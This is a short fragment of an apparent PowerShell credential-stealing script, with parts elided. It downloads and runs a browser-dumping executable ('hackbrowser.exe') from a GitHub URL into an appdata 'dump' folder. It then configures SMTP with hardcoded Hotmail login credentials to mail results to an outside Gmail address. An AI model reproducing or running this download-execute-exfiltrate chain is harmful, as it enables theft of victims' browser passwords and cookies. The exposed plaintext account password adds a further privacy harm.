...
Invoke-WebRequest -Uri "https://github.com/Sabar3/doggosabar23/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("doggosabar23@hotmail.com", "sabar123shiba");
$smtp.EnableSsl = $true
$Message.From = "doggosabar23@hotmail.com"
$Message.To.Add("navilifel@gmail.com")
